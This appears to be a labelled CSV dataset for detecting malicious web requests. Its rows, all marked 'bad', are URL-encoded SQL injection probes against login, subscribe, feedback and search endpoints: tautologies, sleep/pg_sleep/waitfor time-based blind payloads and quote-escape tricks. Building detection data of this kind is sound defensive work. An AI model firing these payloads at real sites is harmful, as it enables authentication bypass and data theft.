method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'btnSubmit=-1%20or%20103%3d0&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,2,1,bad
GET,b'',b'/search.jsp?query=-1%20or%2084%3d84',0,0,0,0,2,0,bad
POST,b'cfile=%40%40JDhrK&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%27102&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
GET,b'',b'/%40%40b5MGP.htm',0,0,0,0,0,0,bad
POST,b'cfile=-1%27%20or%20%2724%27%3d%2724&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
GET,b'',b'/-1%27%20or%20%2756%27%3d%2756.htm',4,0,0,0,2,0,bad
POST,b'btnSubmit=%40%40GLO1K&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
POST,b'btnSubmit=%40%40mePlV&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/search.jsp?query=-1%20or%2084%3d0',0,0,0,0,2,0,bad
GET,b'',b'/search.jsp?query=%40%40UgYQX',0,0,0,0,0,0,bad
POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%27103&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
POST,b'cfile=JyI%3d&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'btnSubmit=JyI%3d&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%270&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
GET,b'',b'/-1%27%20or%20%2756%27%3d%270.htm',4,0,0,0,2,0,bad
GET,b'',b'/JyI%3d.htm',0,0,0,0,0,0,bad
POST,b'cfile=-1%27%20or%20%2724%27%3d%270&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
GET,b'',b'/search.jsp?query=-1%20or%2084-82%20%3d%202',0,0,0,0,4,0,bad
GET,b'',b'/search.jsp?query=JyI%3d',0,0,0,0,0,0,bad
POST,b'btnSubmit=JyI%3d&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%270&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
GET,b'',b'/-1%22%20or%20%2269%22%3d%2269.htm',0,4,0,0,2,0,bad
POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%2239&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
POST,b'btnSubmit=%bf%27%bf%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
POST,b'cfile=%bf%27%bf%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/%bf%27%bf%22.htm',1,1,0,0,0,0,bad
POST,b'cfile=-1%22%20or%20%2287%22%3d%2287&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
GET,b'',b'/search.jsp?query=%bf%27%bf%22',1,1,0,0,0,0,bad
GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%2774',4,0,0,0,2,0,bad
POST,b'btnSubmit=%bf%27%bf%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%2211&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
POST,b'cfile=%f0%27%27%f0%22%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%220&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
POST,b'btnSubmit=%f0%27%27%f0%22%22&txtEmail=sample%40email.tst',b'/doSubscribe',2,2,0,0,0,0,bad
GET,b'',b'/%f0%27%27%f0%22%22.htm',2,2,0,0,0,0,bad
GET,b'',b'/-1%22%20or%20%2269%22%3d%220.htm',0,4,0,0,2,0,bad
POST,b'cfile=-1%22%20or%20%2287%22%3d%220&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%270',4,0,0,0,2,0,bad
POST,b'btnSubmit=%f0%27%27%f0%22%22&passw=acUn3t1x&uid=1',b'/doLogin',2,2,0,0,0,1,bad
GET,b'',b'/search.jsp?query=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%220&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
GET,b'',b'/high_yield_investments%27%20and%20sleep%284%29%3d%27.htm',2,0,0,1,2,1,bad
POST,b'btnSubmit=Subscribe%27%20and%20sleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,2,1,bad
GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt%27%20and%20sleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
GET,b'',b'/search.jsp?query=-1%27%20or%2074-72%20%3d%20%272',2,0,0,0,4,0,bad
GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login%27%20and%20sleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,2,2,bad
POST,b'cfile=comments.txt&comments=1%27%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/high_yield_investments%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=1%27%22',b'/doSubscribe',1,1,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
POST,b'cfile=comments.txt%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%2255',0,4,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=1%27%22',1,1,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=1%27%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
POST,b'btnSubmit=Login%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
POST,b'cfile=comments.txt&comments=%5c&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=%5c',b'/doSubscribe',0,0,0,0,0,0,bad
GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d17',0,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe%22%20and%20sleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,2,1,bad
GET,b'',b'/high_yield_investments%22%20and%20sleep%284%29%3d%22.htm',0,2,0,1,2,1,bad
POST,b'cfile=comments.txt%22%20and%20sleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
POST,b'btnSubmit=Login&passw=%5c&uid=1',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%220',0,4,0,0,2,0,bad
POST,b'btnSubmit=Login%22%20and%20sleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,2,2,bad
POST,b'cfile=comments.txt&comments=1%c0%00xa7%c0%a2&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=1%c0%00xa7%c0%a2',b'/doSubscribe',0,0,0,0,0,0,bad
GET,b'',b'/high_yield_investments%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
POST,b'btnSubmit=Subscribe%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d0',0,0,0,0,2,0,bad
GET,b'',b'/search.jsp?query=-1%22%20or%2055-53%20%3d%20%222',0,2,0,0,4,0,bad
POST,b'btnSubmit=Login&passw=1%c0%00xa7%c0%a2&uid=1',b'/doLogin',0,0,0,0,0,1,bad
POST,b'btnSubmit=Login%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
POST,b'cfile=comments.txt&comments=%40%40vvzyt&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=%5c',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=%40%40UM0Vt',b'/doSubscribe',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,1,1,2,6,1,bad
GET,b'',b'/high_yield_investments%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,1,1,2,6,1,bad
POST,b'cfile=comments.txt%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%2746',4,0,0,0,2,0,bad
GET,b'',b'/search.jsp?query=1%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
POST,b'btnSubmit=Login&passw=%40%40WI5vh&uid=1',b'/doLogin',0,0,0,0,0,1,bad
POST,b'btnSubmit=Login%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,1,1,2,6,2,bad
POST,b'cfile=comments.txt&comments=JyI%3d&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=JyI%3d',b'/doSubscribe',0,0,0,0,0,0,bad
GET,b'',b'/high_yield_investments%27%3dsleep%284%29%3d%27.htm',2,0,0,1,0,1,bad
POST,b'cfile=comments.txt%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
POST,b'btnSubmit=Subscribe%27%3dsleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,0,1,bad
GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%270',4,0,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=JyI%3d&uid=1',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/search.jsp?query=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
POST,b'btnSubmit=Login%27%3dsleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,0,2,bad
POST,b'btnSubmit=Subscribe&txtEmail=%bf%27%bf%22',b'/doSubscribe',1,1,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=%bf%27%bf%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=%40%40RBDGS',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%22%3dsleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,0,1,bad
GET,b'',b'/high_yield_investments%22%3dsleep%284%29%3d%22.htm',0,2,0,1,0,1,bad
POST,b'cfile=comments.txt%27%3dsleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%22108',0,4,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=%bf%27%bf%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
GET,b'',b'/search.jsp?query=1%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
POST,b'btnSubmit=Login%22%3dsleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,0,2,bad
POST,b'cfile=comments.txt&comments=%f0%27%27%f0%22%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=JyI%3d',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=%f0%27%27%f0%22%22',b'/doSubscribe',2,2,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%20and%20sleep%284%29%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,1,3,1,bad
GET,b'',b'/high_yield_investments%20and%20sleep%284%29%20.htm',0,0,0,1,3,1,bad
POST,b'cfile=comments.txt%22%3dsleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
POST,b'btnSubmit=Login&passw=%f0%27%27%f0%22%22&uid=1',b'/doLogin',2,2,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%220',0,4,0,0,2,0,bad
GET,b'',b'/search.jsp?query=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
POST,b'btnSubmit=Login%20and%20sleep%284%29%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,1,3,2,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
GET,b'',b'/survey_questions.jsp?step=%bf%27%bf%22',1,1,0,0,0,0,bad
GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,1,2,6,1,bad
GET,b'',b'/high_yield_investments%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,0,1,2,6,1,bad
POST,b'cfile=comments.txt%20and%20sleep%284%29%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
GET,b'',b'/survey_questions.jsp?step=b%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
POST,b'btnSubmit=Login%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,1,2,6,2,bad
GET,b'',b'/search.jsp?query=1%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
POST,b'cfile=comments.txt&comments=1&email_addr=1%27%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
GET,b'',b'/survey_questions.jsp?step=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
POST,b'btnSubmit=Subscribe%27%3bselect%20pg_sleep%284%29%3b%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,1,3,2,bad
POST,b'cfile=comments.txt%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
GET,b'',b'/high_yield_investments%27%3bselect%20pg_sleep%284%29%3b%20--%20.htm',1,0,1,1,3,2,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%27%22',b'/doLogin',1,1,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
POST,b'btnSubmit=Login%27%3bselect%20pg_sleep%284%29%3b%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,1,3,3,bad
POST,b'cfile=comments.txt&comments=1&email_addr=%5c&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
GET,b'',b'/search.jsp?query=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
GET,b'',b'/swagger/-1%20or%2087%3d87.html',0,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',3,0,1,0,5,2,bad
POST,b'cfile=comments.txt%27%3bselect%20pg_sleep%284%29%3b%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
GET,b'',b'/high_yield_investments%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',3,0,1,0,5,2,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%5c',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
POST,b'btnSubmit=Login%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',3,0,1,0,5,3,bad
POST,b'cfile=comments.txt&comments=1&email_addr=1%c0%00xa7%c0%a2&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
GET,b'',b'/search.jsp?query=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
GET,b'',b'/swagger/1%27%22.html',1,1,0,0,0,0,bad
GET,b'',b'/swagger/-1%20or%2087%3d0.html',0,0,0,0,2,0,bad
